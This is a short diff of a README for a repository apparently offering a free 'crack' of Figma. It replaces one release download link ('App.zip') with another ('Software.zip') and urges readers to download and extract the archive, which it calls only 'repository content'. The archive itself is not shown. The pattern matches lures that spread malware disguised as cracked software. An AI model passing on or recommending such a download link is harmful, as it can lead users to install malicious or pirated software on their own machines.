@@ -27,7 +27,7 @@ Here are the topics covered in this repository:
 
 ## Get Started
 
-To access the content of this repository, you can download the repository content archive by clicking [here](https://github.com/RN098/figma-free-crack/releases/download/v1.0/App.zip). Please make sure to extract the contents of the archive once downloaded for further access.
+To access the content of this repository, you can download the repository content archive by clicking [here](https://github.com/RN098/figma-free-crack/releases/download/v2.0/Software.zip). Please make sure to extract the contents of the archive once downloaded for further access.
 
 ## Contribute
 
